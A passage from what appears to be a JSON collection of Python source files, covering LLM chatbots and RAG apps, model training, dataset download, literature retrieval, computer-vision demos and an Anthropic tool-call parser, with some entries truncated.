f\"./tmp_img.png\"\n        img_path = resize_image(img_path, tmp_img_path, new_width=512)\n\n    os.makedirs(output_dir, exist_ok=True)\n    # save original image\n    img = Image.open(img_path)\n    img.save(f\"{output_dir}/input_img.png\")\n    \n    svg_strs, svg_paths = img_2_svg_strs(method=svg_conversion_method, img_path=img_path, svg_config=img_2_svg_configs, svg_output_dir=svg_output_dir, topk_paths=30, diff_threshold=diff_threshold)\n\n    # rm tmp_img_path\n    if resize_image_before_conversion and os.path.exists(tmp_img_path):\n        os.remove(tmp_img_path)\n\n    # === inference ===\n    inputs = []\n    responses = []\n    for i, svg_str in enumerate(svg_strs):\n        print(f\"svg_str {i}:\", svg_str)\n        \n        prompt = get_prompt_general_from_svg_str(svg_str, \"Describe the visual content of the image in a JSON format.\")\n        system_prompt = SYSTEM_MESSAGES[\"svg_expert\"]\n        \n        # ===============\n        messages = [\n            {\n                \"role\": \"system\",\n                \"content\": system_prompt\n            },\n            {\n                \"role\": \"user\",\n                \"content\": prompt\n            }\n        ]\n        # ===============\n        print(\"input messages:\", messages)\n\n        query_obj = {\n            \"model\": model_id,\n            \"messages\": messages,\n            **generation_configs\n        }\n        chat_response = client.chat.completions.create(**query_obj)\n        print(chat_response)\n        print()\n        print(chat_response.choices[0].message.content)\n        inputs.append(messages)\n        responses.append(chat_response.choices[0].message.content)\n\n    # === save perception results ===\n    os.makedirs(output_perception_dir, exist_ok=True)\n    w, h = Image.open(img_path).size\n    resized_img_size_for_vis = (w, h) # use original size\n    response_dict = {}\n    for i, response in enumerate(responses):\n        svg_path = svg_paths[i]\n        svg_basename = os.path.basename(svg_path)\n        vis_img = visualize_pvd_shape_prediction(response, resized_img_size_f",
    "import streamlit as st\nfrom PyPDF2 import PdfReader\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\nfrom langchain.embeddings.openai import OpenAIEmbeddings\nfrom langchain.vectorstores import FAISS\nfrom langchain.chains.question_answering import load_qa_chain\nfrom langchain_community.chat_models import ChatOpenAI\nfrom dotenv import dotenv_values\nimport time\n\nsecret = dotenv_values(\".env\")\n\nprogress_bar = st.progress(0)\nfor i in range(100):\n    progress_bar.progress(i + 1)\n    time.sleep(0.1)\n\n\nOPENAI_API_KEY = secret[\"OPENAI_API_KEY\"]\n\n# Header of the webpage\nst.header(\"Euclidean Chatbot Project\")\n\n\n# Uploading Documents\nwith st.sidebar:\n    st.title(\"Your Documents\")\n    file = st.file_uploader(\"Upload your file and start asking questions\", type=\"Pdf\")\n\n# Extracting the text\nif file is not None:\n    pdf_reader = PdfReader(file)  # pdf_reader containes the read file\n    text = \"\"\n    for page in pdf_reader.pages:  # returning page coordinates\n\n        text = (\n            text + page.extract_text()\n        )  # to extract the texts from page we use extract_text()\n    # st.write(text)\n\n    # Breaking it into chunks\n    text_splitter = RecursiveCharacterTextSplitter(\n        separators=\"\\n\",\n        chunk_size=1000,  # length of each chunk is 1000 characters\n        chunk_overlap=150,  # +- 150 characters of abover and below will be considered\n        length_function=len,\n    )\n    chunks = text_splitter.split_text(text)\n    # st.write(chunks)\n\n    # Generating Embeddings\n    embeddings = OpenAIEmbeddings(openai_api_key=OPENAI_API_KEY)\n\n    # creating vector storage - FAISS (facebook AI semantic search)\n    vector_store = FAISS.from_texts(\n        chunks, embeddings\n    )  # Chiz(chunks) - Its value(embeddings)\n\n    # get user question\n    user_question = st.text_input(\"Type your question here\")\n\n    # Create two columns\n    col1, col2 = st.columns(2)\n\n    # Add a button to the first column\n    with col1:\n        button1 = st.button(\"Summary Of Document\")\n\n    # Add a button to the second column\n    with col2:\n        button2 = st.button(\"Important Pointers\")\n\n    # button clicked\n    option = None  # Initialize option outside the button click check\n    search_triggered = False  # Initialize search_triggered\n\n    if button1:\n        option = \"Summary Of Document\"\n        search_triggered = True\n    elif button2:\n        option = \"Important Pointers\"\n        search_triggered = True\n\n    # Check if the search should be triggered\n    if st.session_state.get(\"last_option\") != option:\n        st.session_state[\"last_option\"] = option\n        search_triggered = True\n\n    # Do similarity search and generate response\n    if user_question or search_triggered:\n        match = vector_store.similarity_search(user_question)\n        llm = ChatOpenAI(\n            openai_api_key=OPENAI_API_KEY,\n            temperature=0,  # lower the value more accurate (randomness less)\n            max_tokens=1000,  # finetuning stuffs\n            model_name=\"gpt-3.5-turbo\",\n        )\n\n        # output results\n        # chain - take the question , get relevant documents , pass it to the llm, generate the output\n        chain = load_qa_chain(llm, chain_type=\"stuff\")\n\n        if option == \"Important Pointers\":\n            pointers_question = \"List the important pointers from the document.\"\n            response = chain.run(input_documents=match, question=pointers_question)\n        elif option == \"Summary Of Document\":\n            summary_question = \"Provide a summary of the document.\"\n            response = chain.run(input_documents=match, question=summary_question)\n        else:\n            # Default case, use the original user question\n            response = chain.run(input_documents=match, question=user_question)\n\n        st.write(response)\n",
    "# Example script for getting events from google calendar using the api\n# This quickstart script can be accessed on this link: https://developers.google.com/calendar/api/quickstart/python\n\nimport datetime\nimport os.path\n\nfrom google.auth.transport.requests import Request\nfrom google.oauth2.credentials import Credentials\nfrom google_auth_oauthlib.flow import InstalledAppFlow\nfrom googleapiclient.discovery import build\nfrom googleapiclient.errors import HttpError\n\n# If modifying these scopes, delete the file token.json.\nSCOPES = [\"https://www.googleapis.com/auth/calendar\"]\n\n\ndef main():\n    \"\"\"Shows basic usage of the Google Calendar API.\n  Prints the start and name of the next 10 events on the user's calendar.\n  \"\"\"\n    creds = None\n    # The file token.json stores the user's access and refresh tokens, and is\n    # created automatically when the authorization flow completes for the first\n    # time.\n    if os.path.exists(\"token.json\"):\n        creds = Credentials.from_authorized_user_file(\"token.json\", SCOPES)\n    # If there are no (valid) credentials available, let the user log in.\n    if not creds or not creds.valid:\n        if creds and creds.expired and creds.refresh_token:\n            creds.refresh(Request())\n        else:\n            flow = InstalledAppFlow.from_client_secrets_file(\n                \"credentials.json\", SCOPES\n            )\n            creds = flow.run_local_server(port=0)\n        # Save the credentials for the next run\n        with open(\"token.json\", \"w\") as token:\n            token.write(creds.to_json())\n\n    try:\n        service = build(\"calendar\", \"v3\", credentials=creds)\n\n        # Call the Calendar API\n        now = datetime.datetime.utcnow().isoformat() + \"Z\"  # 'Z' indicates UTC time\n        print(\"Getting the upcoming 10 events\")\n        events_result = (\n            service.events()\n            .list(\n                calendarId=\"primary\",\n                timeMin=now,\n                maxResults=10,\n                singleEvents=True,\n                orderBy=\"startTime\",\n            )\n            .execute()\n        )\n        events = events_result.get(\"items\", [])\n\n        if not events:\n            print(\"No upcoming events found.\")\n            return\n\n        # Prints the start and name of the next 10 events\n        for event in events:\n            start = event[\"start\"].get(\"dateTime\", event[\"start\"].get(\"date\"))\n            print(start, event[\"summary\"])\n\n    except HttpError as error:\n        print(f\"An error occurred: {error}\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n########################################################################\n#\n# Copyright (c) 2024 Sugar. All Rights Reserved\n#\n########################################################################\n\n\"\"\"\n    File: train_text_classification.py\n    Desc: \u6587\u672c\u5206\u7c7b\u8bad\u7ec3\u4ee3\u7801\n    Author: sugar(@google.com)\n    Date: 2024-04-1 11:25\n    desc: \u7eaa\u5ff5\u4e00\u4e0bleslie \u5f35\u767c\u5b97\n    code refer: https://github.com/zyds/transformers-code/blob/master/01-Getting%20Started/04-model/classification_demo.ipynb\n\"\"\"\nimport os\nimport sys\nimport warnings\nwarnings.filterwarnings('ignore')\ndevice = '3'  # \u672c\u6b21\u5b9e\u9a8c\u9700\u8981\u7528\u5230\u7684\u5361\nos.environ[\"CUDA_VISIBLE_DEVICES\"] = device\nos.environ['CUDA_LAUNCH_BLOCKING'] = device\nimport torch\nimport torch.nn as nn\nimport transformers\nimport datasets\nfrom transformers import AutoTokenizer, AutoModelForSequenceClassification,TrainingArguments,Trainer\nfrom datasets import load_dataset\nfrom torch.utils.data import DataLoader,Dataset,random_split\nimport pandas as pd\nfrom datasets import Dataset as HFDataset\nfrom data_utils import TextClassification\nfrom text_trainer import MyTrainer\nfrom text_callback import ProgressCallback\n\n\n\ndef run(data_path, pretrained_model_name_or_path,classes):\n    def process_func(examples):\n        review = examples['review']\n        label = examples['labels']\n        inputs = tokenizer(review,max_length=128,padding=\"max_length\",truncation=True,return_tensors='pt')\n        inputs['labels'] = torch.tensor(label)\n        return inputs\n\n    # ===============================  \u52a0\u8f7d\u6570\u636e\u96c6  =============================== #\n    tokenizer = AutoTokenizer.from_pretrained(pretrained_model_name_or_path)\n    dataset = TextClassification(data_path)\n    # \u6ce8\u610fdataset\u8fd4\u56de\u7684\u662f\u5b57\u5178\u5f62\u5f0f \u65b9\u4fbf\u6784\u5efahuggingface dataset\n    train_dataset, valid_dataset = random_split(dataset, lengths=[0.9, 0.1])\n    # \u8f6c\u4e3ahuggingface dataset\n    train_ds = HFDataset.from_list(train_dataset)\n    valid_ds = HFDataset.from_list(valid_dataset)\n\n    tokenizer_train_ds = train_ds.map(process_func,batched=True,remove_columns=train_ds.column_names)\n    tokenizer_valid_ds = valid_ds.map(process_func,batched=True,remove_columns=valid_ds.column_names)\n\n    # \u52a0\u8f7d\u6a21\u578b \u6ce8\u610fclasses\u53c2\u6570 \u8fd9\u91cc\u662f2\u5206\u7c7b\n    model = AutoModelForSequenceClassification.from_pretrained(pretrained_model_name_or_path,num_labels=classes)\n\n    # ===============================  \u6784\u5efaTrainer  =============================== #\n    args = TrainingArguments(\n        output_dir=\"./text_classification\",\n        per_device_train_batch_size = 4,\n        per_device_eval_batch_size = 4,\n        gradient_accumulation_steps = 8,\n        logging_steps = 50,\n        num_train_epochs = 2,\n        evaluation_strategy = 'steps',\n        # \u662f\u5426\u6253\u5f00\u8fdb\u5ea6\u6761\n        # disable_tqdm = True,\n        report_to = 'tensorboard',\n        )\n    \n    trainer = MyTrainer(\n        model=model,\n        args=args,\n        train_dataset=tokenizer_train_ds,\n        eval_dataset=tokenizer_valid_ds,)\n    # ===============================  \u6784\u5efaCallBack  =============================== #\n    progress_callback = ProgressCallback().setup(total_epochs=args.num_train_epochs,print_every=200)\n    trainer.add_callback(progress_callback)\n\n    # ===============================  \u8bad\u7ec3\u6a21\u578b  =============================== #\n    trainer.train()\n    trainer.save_state()\n    trainer.save_model(output_dir=training_args.output_dir)\n\nif __name__ == '__main__':\n    data_path                       = 'data/ChnSentiCorp_htl_all.csv'\n    pretrained_model_name_or_path   = 'dienstag/chinese-bert-wwm'\n    classes                         = 2\n    run(data_path = data_path, pretrained_model_name_or_path = pretrained_model_name_or_path, classes = classes)\n",
    "import json\nimport gradio as gr\nfrom modules import ui_settings, shared\nfrom old_sd_firstpasser.tools import quote_swap, NAME\n\n\ndef makeUI(script):\n    with gr.Row():\n        firstpass_steps = gr.Slider(\n            label='Firstpass steps',\n            value=20,\n            step=1,\n            minimum=1,\n            maximum=150,\n            elem_id=\"firstpass_steps\"\n        )\n        firstpass_denoising = gr.Slider(label='Firstpass denoising',\n            value=0.55, elem_id=\"firstpass_denoising\",\n            minimum=0.0, maximum=1.0, step=0.01\n        )\n    with gr.Row():\n        firstpass_upscaler = gr.Dropdown(\n            value=\"ESRGAN_4x\",\n            choices=[x.name for x in shared.sd_upscalers],\n            label=\"Firstpass upscaler\",\n            elem_id=\"firstpass_upscaler\",\n        )\n    with gr.Row():\n        sd_1_checkpoint = ui_settings.create_setting_component('sd_model_checkpoint')\n        sd_1_checkpoint.label = \"Checkpoint for SD 1.x pass\"\n\n    def get_infotext_field(d, field):\n        if NAME in d:\n            return d[NAME].get(field)\n\n    script.infotext_fields = [\n        (firstpass_steps, lambda d: get_infotext_field(d, 'steps')),\n        (firstpass_denoising, lambda d: get_infotext_field(d, 'denoising')),\n        (firstpass_upscaler, lambda d: get_infotext_field(d, 'upscaler')),\n        (sd_1_checkpoint, lambda d: get_infotext_field(d, 'model')),\n    ]\n\n    return [firstpass_steps, firstpass_denoising, firstpass_upscaler, sd_1_checkpoint]\n\n\ndef pares_infotext(infotext, params):\n    try:\n        params[NAME] = json.loads(params[NAME].translate(quote_swap))\n    except Exception:\n        pass",
    "import argparse\nimport os\nimport re\nimport shutil\nfrom pathlib import Path\n\nimport img2dataset\nfrom cloudpathlib import CloudPath\nfrom huggingface_hub import snapshot_download\n\nfrom scale_configs import available_scales\n\n# import wandb\n# wandb.init(\n#     project='datacomp_medium',\n    \n# )\ndef path_or_cloudpath(s):\n    if re.match(r\"^\\w+://\", s):\n        return CloudPath(s)\n    return Path(s)\n\n\ndef cleanup_dir(path):\n    assert isinstance(path, Path) or isinstance(path, CloudPath)\n    if isinstance(path, Path):\n        shutil.rmtree(path)\n    else:\n        path.rmtree()\n\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n\n    parser.add_argument(\n        \"--scale\",\n        type=str,\n        required=False,\n        choices=available_scales(simple_names=True)[1:] + [\"datacomp_1b\"],\n        default=\"small\",\n        help=\"Competition scale.\",\n    )\n    parser.add_argument(\n        \"--data_dir\",\n        type=path_or_cloudpath,\n        required=True,\n        help=\"Path to directory where the data (webdataset shards) will be stored.\",\n    )\n    parser.add_argument(\n        \"--metadata_dir\",\n        type=path_or_cloudpath,\n        default=None,\n        help=\"Path to directory where the metadata will be stored. If not set, infer from data_dir.\",\n    )\n    parser.add_argument(\n        \"--download_npz\",\n        help=\"If true, also download npz files.\",\n        action=\"store_true\",\n        default=False,\n    )\n    parser.add_argument(\n        \"--skip_shards\",\n        help=\"If true, only download metadata.\",\n        action=\"store_true\",\n        default=False,\n    )\n    parser.add_argument(\n        \"--overwrite_metadata\",\n        help=\"If true, force re-download of the metadata files.\",\n        action=\"store_true\",\n        default=False,\n    )\n    parser.add_argument(\n        \"--skip_bbox_blurring\",\n        help=\"If true, skip bounding box blurring on images while downloading.\",\n        action=\"store_true\",\n        default=False,\n    )\n    parser.add_argument(\n        \"--processes_count\",\n        type=int,\n        required=False,\n        default=16,\n        help=\"Number of processes for download.\",\n    )\n    parser.add_argument(\n        \"--thread_count\",\n        type=int,\n        required=False,\n        default=128,\n        help=\"Number of threads for download.\",\n    )\n    parser.add_argument(\n        \"--image_size\",\n        type=int,\n        required=False,\n        default=512,\n        help=\"Size images need to be downloaded to.\",\n    )\n    parser.add_argument(\n        \"--resize_mode\",\n        type=str,\n        required=False,\n        choices=[\"no\", \"border\", \"keep_ratio\", \"keep_ratio_largest\", \"center_crop\"],\n        default=\"keep_ratio_largest\",\n        help=\"Resizing mode used by img2dataset when downloading images.\",\n    )\n    parser.add_argument(\n        \"--no_resize_only_if_bigger\",\n        help=\"If true, do not resize only if images are bigger than target size.\",\n        action=\"store_true\",\n        default=False,\n    )\n    parser.add_argument(\n        \"--encode_format\",\n        type=str,\n        required=False,\n        choices=[\"png\", \"jpg\", \"webp\"],\n        default=\"jpg\",\n        help=\"Images encoding format.\",\n    )\n    parser.add_argument(\n        \"--output_format\",\n        type=str,\n        required=False,\n        choices=[\"webdataset\", \"tfrecord\", \"parquet\", \"files\"],\n        default=\"webdataset\",\n        help=\"Output format used by img2dataset when downloading images.\",\n    )\n    parser.add_argument(\n        \"--retries\",\n        type=int,\n        required=False,\n        default=2,\n        help=\"Number of time a download should be retried (default 2)\",\n    )\n    parser.add_argument(\n        \"--enable_wandb\",\n        action=\"store_true\",\n        default=False,\n        help=\"Whether to enable wandb logging (default False)\",\n    )\n    parser.add_argument(\n        \"--wandb_project\",\n        type=str,\n        required=False,\n        default=\"datacomp\",\n        help=\"Name of W&B project used (default datacomp)\",\n    )\n\n    args = parser.parse_args()\n\n    hf_repo = (\n        f\"mlfoundations/datacomp_{args.scale}\"\n        if args.scale != \"datacomp_1b\"\n        else \"mlfoundations/datacomp_1b\"\n    )\n\n    metadata_dir = args.metadata_dir\n    if metadata_dir is None:\n        metadata_dir = args.data_dir / \"metadata\"\n\n    # Download the metadata files if needed.\n    if args.overwrite_metadata or not metadata_dir.exists():\n        if metadata_dir.exists():\n            print(f\"Cleaning up {metadata_dir}\")\n            shutil.rmtree(metadata_dir)\n        metadata_dir.mkdir(parents=True)\n\n        print(f\"Downloading metadata to {metadata_dir}...\")\n\n        cache_dir = metadata_dir.parent / f\"hf\"\n        hf_snapshot_args = dict(\n            repo_id=hf_repo,\n            allow_patterns=f\"*.parquet\",\n            local_dir=metadata_dir,\n            cache_dir=cache_dir,\n            local_dir_use_symlinks=False,\n            repo_type=\"dataset\",\n        )\n\n        if args.scale == \"xlarge\":\n            hf_snapshot_",
    "import random\n\nfrom datallm_server.types import DtypeEnum, NamedValue\nimport json\n\n\ndef get_prompt_from_components(\n    prompt: str,\n    data_description: str | None,\n    dtype: DtypeEnum,\n    values: list[NamedValue] | None,\n    categories: list[str] | None,\n) -> str:\n    \"\"\"\n    Returns a prompt string for the engine to use based on the input components.\n\n    Args:\n        prompt: The prompt that the user provides.\n        data_description: The context to use for the prompt.\n        dtype: The desired dtype of the completion.\n        values: The feature values to use for the prompt.\n        categories: The categories the user wants to limit the completion to.\n    \"\"\"\n\n    sample = {\n        \"user_prompt\": prompt.strip(),\n        \"data_description\": data_description,\n        \"features\": {v.name: v.value for v in values} if values else None,\n        \"dtype\": dtype.value,\n        \"categories\": categories,\n    }\n    prompt = create_prompt(sample)\n    return prompt\n\n\ndef create_prompt(sample: dict):\n    # prepare task\n    dtype = sample[\"dtype\"]\n    if dtype == \"category\":\n        categories = sample[\"categories\"]\n        random.shuffle(categories)  # randomize the order of categories to avoid any position bias\n        task = (\n            \"Sample from the following categories: [\" + \" || \".join(categories) + \"].\"\n        )\n    elif dtype == \"boolean\":\n        categories = [\"True\", \"False\"]\n        random.shuffle(categories)  # randomize the order of categories to avoid any position bias\n        task = (\n            \"Sample from the following categories: [\" + \" || \".join(categories) + \"].\"\n        )\n    elif dtype == \"integer\":\n        task = \"Sample an integer number.\"\n    elif dtype == \"float\":\n        task = \"Sample a float number with decimal digits.\"\n    elif dtype == \"datetime\":\n        task = \"Sample a datetime in format YYYY-MM-DD HH:MM:SS.\"\n    else:\n        task = \"Sample a string.\"\n\n    # prepare description\n    description = (\n        sample[\"data_description\"]\n        if \"data_description\" in sample and sample[\"data_description\"]\n        else \"\"\n    )\n\n    # prepare features\n    if sample[\"features\"]:\n        if isinstance(sample[\"features\"], str):\n            features_dict = json.loads(sample[\"features\"])\n        else:\n            features_dict = sample[\"features\"]\n        features = \", \".join([f\"{k}: {v}\" for k, v in features_dict.items()])\n    else:\n        features = \"\"\n\n    # create prompt\n    prompt = f\"\"\"You are an expert data generator. Generate one random sample.\n\n### Task:\n{task}\n\n### Data Description:\n{description}\n\n### Features:\n{features}\n\n### User Prompt:\n{sample['user_prompt']}\n\n### Response:\n\"\"\"\n\n    # append response if provided\n    if \"response\" in sample:\n        prompt = f\"<s>{prompt}{sample['response']}</s>\"\n    return prompt\n",
    "import gradio as gr\nimport re\nimport requests\nimport time\nimport xml.etree.ElementTree as ET\nimport yake\n\nfrom modules.logging_colors import logger\n\nparams = {\n    \"arxiv_url\": \"http://export.arxiv.org/api/\",\n    \"ncbi_url\": \"https://eutils.ncbi.nlm.nih.gov/entrez/eutils\",\n    \"search_arxiv\": False,\n    \"search_pubmed\": True,\n    \"tagger_active\": False,\n    \"tagger_url\": \"https://tagger.jensenlab.org/\",\n    \"yake_active\": False,\n    \"yake_limit\": 10,\n    \"yake_score\": 0.05\n}\n\ndef add_context(articles, state):\n    \"\"\"\n    Creates LLM context from a set of references.\n    \"\"\"\n    for article in articles:\n        if \"id\" in article and \"title\" in article:\n            state[\"context\"] += \"\\n\\n\"+article[\"id\"]+\"\\ntitle: \"+article[\"title\"]\n            if \"abstract\" in article:\n                state[\"context\"] += \"\\nabstract: \"+article[\"abstract\"]\n\ndef retrieve_arxiv(refs):\n    \"\"\"\n    Retrieves titles and abstracts for a list of arXiv identifiers.\n    \"\"\"\n    postdata = {\n        \"id_list\": \",\".join(set(refs))\n    }\n    xmlstring = requests.post(params[\"arxiv_url\"]+\"/query\", data=postdata).text\n    articles = []\n    root = ET.fromstring(xmlstring)\n    for node in root:\n        if node.tag == \"{http://www.w3.org/2005/Atom}entry\":\n            article = {}\n            for node in node:\n                if node.tag == \"{http://www.w3.org/2005/Atom}id\":\n                    article[\"id\"] = re.sub(r\".*?([0-9][0-9][0-9][0-9]\\.[0-9]+)(v[0-9]+)?\", r\"arXiv:\\1\", node.text)\n                elif node.tag == \"{http://www.w3.org/2005/Atom}title\":\n                    article[\"title\"] = node.text\n                elif node.tag == \"{http://www.w3.org/2005/Atom}summary\":\n                    article[\"abstract\"] = node.text\n            articles.append(article)\n    return articles\n\ndef retrieve_pubmed(refs):\n    \"\"\"\n    Retrieves titles and abstracts for a list of PubMed identifiers.\n    \"\"\"\n    postdata = {\n        \"db\": \"pubmed\",\n        \"id\": \",\".join(set(refs))\n    }\n    xmlstring = requests.post(params[\"ncbi_url\"]+\"/efetch.fcgi\", data=postdata).text\n    articles = []\n    root = ET.fromstring(xmlstring)\n    for node in root:\n        if node.tag == \"PubmedArticle\":\n            article = {}\n            for node in node:\n                if node.tag == \"MedlineCitation\":\n                    for node in node:\n                        if node.tag == \"PMID\":\n                            article[\"id\"] = \"PMID:\"+node.text\n                        elif node.tag == \"Article\":\n                            for node in node:\n                                if node.tag == \"ArticleTitle\" and node.text is not None:\n                                    article[\"title\"] = node.text\n                                if node.tag == \"Abstract\":\n                                    for node in node:\n                                        if node.tag == \"AbstractText\" and node.text is not None:\n                                            article[\"abstract\"] = node.text\n            articles.append(article)\n    return articles\n\ndef search_arxiv(terms):\n    \"\"\"\n    Search arXiv for a list of terms.\n    \"\"\"\n    terms = ['\"'+term+'\"' for term in terms]\n    if (len(terms) > 1):\n        terms = list(set([i+\" \"+j for i,j in zip(terms, terms[1:])]))+list(set(terms))\n    refs = set()\n    for term in terms:\n        postdata = {\n            \"max_results\": 5,\n            \"search_query\": term,\n            \"sortBy\": \"relevance\"\n        }\n        xmlstring = requests.post(params[\"arxiv_url\"]+\"/query\", data=postdata).text\n        root = ET.fromstring(xmlstring)\n        for node in root:\n            if node.tag == \"{http://www.w3.org/2005/Atom}entry\":\n                for node in node:\n                    if node.tag == \"{http://www.w3.org/2005/Atom}id\":\n                        refs.add(re.sub(r\".*?([0-9][0-9][0-9][0-9]\\.[0-9]+)(v[0-9]+)?\", r\"\\1\", node.text))\n        if len(refs) >= 20:\n            break\n        time.sleep(1.0)\n    return refs\n\ndef search_pubmed(terms):\n    \"\"\"\n    Search Pubmed for a list of terms.\n    \"\"\"\n    if (len(terms) > 1):\n        terms = list(set([i+\" AND \"+j for i,j in zip(terms, terms[1:])]))+list(set(terms))\n    refs = set()\n    for term in terms:\n        postdata = {\n            \"db\": \"pubmed\",\n            \"retmax\": 5,\n            \"sort\": \"relevance\",\n            \"term\": term\n        }\n        xmlstring = requests.post(params[\"ncbi_url\"]+\"/esearch.fcgi\", data=postdata).text\n        root = ET.fromstring(xmlstring)\n        for node in root:\n            if node.tag == \"IdList\":\n                for node in node:\n                    if node.tag == \"Id\":\n                        refs.add(node.text)\n        if len(refs) >= 20:\n            break\n        time.sleep(1.0)\n    return refs\n\ndef ui():\n    \"\"\"\n    Gets executed when the UI is drawn. Custom gradio elements and\n    their corresponding event handlers should be defined here.\n    \"\"\"\n    with gr.Accordion(\"Seshat\", open=True):\n        with gr.Row():\n            search_arxiv = gr.Checkbox(label=\"Search arXiv",
    "import cv2\nimport numpy as np\n\n# Load the Haar Cascade files for face and eye detection\nface_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')\neye_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_eye.xml')\n\ndef detect_eyes(img, classifier):\n    gray_frame = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n    eyes = classifier.detectMultiScale(gray_frame, 1.3, 5)  # Detect eyes\n    for (ex, ey, ew, eh) in eyes:\n        cv2.rectangle(img, (ex, ey), (ex+ew, ey+eh), (0, 255, 0), 2)\n    return img, len(eyes)\n\ndef detect_face(img, classifier):\n    gray_frame = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n    faces = classifier.detectMultiScale(gray_frame, 1.3, 5)  # Detect the face\n    for (x, y, w, h) in faces:\n        cv2.rectangle(img, (x, y), (x+w, y+h), (255, 0, 0), 2)\n        roi_color = img[y:y+h, x:x+w]\n        roi_color, eyes_detected = detect_eyes(roi_color, eye_cascade)\n        if eyes_detected > 0:\n            print(\"Eyes open\")\n        else:\n            print(\"Eyes closed\")\n    return img\n\ncap = cv2.VideoCapture(0)\n\nwhile True:\n    ret, frame = cap.read()\n    if not ret:\n        break\n    frame = detect_face(frame, face_cascade)\n    cv2.imshow('Frame', frame)\n    if cv2.waitKey(1) & 0xFF == ord('q'):\n        break\n\ncap.release()\ncv2.destroyAllWindows()\n",
    "from typing import List, Any\nfrom langchain_core.exceptions import OutputParserException\nfrom langchain_core.output_parsers import BaseOutputParser\nfrom langchain_core.outputs import Generation, ChatGeneration\n\n\n# Will be deprecated\nclass AnthropicOutputParser(BaseOutputParser):\n    @property\n    def _type(self) -> str:\n        return \"json_functions\"\n\n    def parse(self, text: str) -> Any:\n        raise NotImplementedError()\n\n    def parse_result(self, result: List[Generation], *, partial: bool = False) -> Any:\n        if len(result) != 1:\n            raise OutputParserException(\n                f\"Expected exactly one result, but got {len(result)}\"\n            )\n        generation = result[0]\n        if not isinstance(generation, ChatGeneration):\n            raise OutputParserException(\n                \"This output parser can only be used with a chat generation.\"\n            )\n        message = generation.message\n        # print(f\"message: {message}\")\n\n        if \"<invoke>\" in message.content:\n            start_tag = \"<invoke>\"\n            end_tag = \"</invoke>\"\n            invoke_text = message.content[\n                          message.content.find(start_tag) + len(start_tag):message.content.find(end_tag)\n                          ]\n            if \"<tool_name>\" in invoke_text:\n                start_tag = \"<tool_name>\"\n                end_tag = \"</tool_name>\"\n                tool_name = invoke_text[invoke_text.find(start_tag) + len(start_tag):invoke_text.find(end_tag)]\n\n                parameters = {}\n                if \"<parameters>\" in invoke_text:\n                    start_tag = \"<parameters>\"\n                    end_tag = \"</parameters>\"\n                    parameters_text = invoke_text[\n                                      invoke_text.find(start_tag) + len(start_tag):invoke_text.find(end_tag)]\n                    parameter_pairs = parameters_text.strip(\"\\n\").split(\">\")\n\n                    current_key = None\n                    current_value = \"\"\n                    for pair in parameter_pairs:\n                        pair = pair.lstrip(\"\\n\").rstrip(\"\\n\").strip(\"\\n\")\n                        if pair == '':\n                            continue\n                        elif pair.startswith(\"<\"):\n                            if current_key:\n                                parameters[current_key] = current_value.strip()\n                            current_key = pair.lstrip(\"<\").strip()\n                            current_value = \"\"\n                        else:\n                            current_value += pair.removesuffix(f\"</{current_key}\")\n\n                    if current_key:\n                        parameters[current_key] = current_value.strip()\n                    return parameters\n        else:\n            return message\n",
    "# rocat/chatbot.py\nfrom abc import ABC, abstractmethod\nfrom openai import OpenAI\nimport anthropic\n\nclass Chatbot(ABC):\n    @abstractmethod\n    def set_system_prompt(self, new_prompt):\n        pass\n\n    @abstractmethod\n    def generate_response(self, user_prompt):\n        pass\n\nclass OpenAIChatbot(Chatbot):\n    def __init__(self, api_key, model=\"gpt-3.5-turbo\", max_tokens=512, temperature=0.7):\n        \"\"\"Initialize the OpenAI chatbot with the given API key, model, and hyperparameters.\"\"\"\n        self.client = OpenAI(api_key=api_key)\n        self.model = model\n        self.max_tokens = max_tokens\n        self.temperature = temperature\n        self.system_prompt = \"You are a helpful assistant.\"\n\n    def set_system_prompt(self, new_prompt):\n        \"\"\"Set the system prompt for the chatbot.\"\"\"\n        self.system_prompt = new_prompt\n\n    def generate_response(self, user_prompt):\n        \"\"\"Generate a response based on the given user prompt.\"\"\"\n        response = self.client.chat.completions.create(\n            model=self.model,\n            max_tokens=self.max_tokens,\n            temperature=self.temperature,\n            messages=[\n                {\"role\": \"system\", \"content\": self.system_prompt},\n                {\"role\": \"user\", \"content\": user_prompt}\n            ],\n        )\n        return response.choices[0].message.content.strip()\n\nclass ClaudeChatbot(Chatbot):\n    def __init__(self, api_key, model=\"claude-3-haiku-20240307\", max_tokens=512, temperature=0.7):\n        \"\"\"Initialize the Claude chatbot with the given API key, model, max_tokens, and temperature.\"\"\"\n        self.client = anthropic.Anthropic(api_key=api_key)\n        self.model = model\n        self.max_tokens = max_tokens\n        self.temperature = temperature\n        self.system_prompt = \"You are a helpful assistant.\"\n\n    def set_system_prompt(self, new_prompt):\n        \"\"\"Set the system prompt for the chatbot.\"\"\"\n        self.system_prompt = new_prompt\n\n    def generate_response(self, user_prompt):\n        \"\"\"Generate a response based on the given user prompt.\"\"\"\n        response = self.client.messages.create(\n            model=self.model,\n            max_tokens=self.max_tokens,\n            temperature=self.temperature,\n            system=self.system_prompt,\n            messages=[\n                {\"role\": \"user\", \"content\": user_prompt}\n            ]\n        )\n        return response.content[0].text\n        \n",
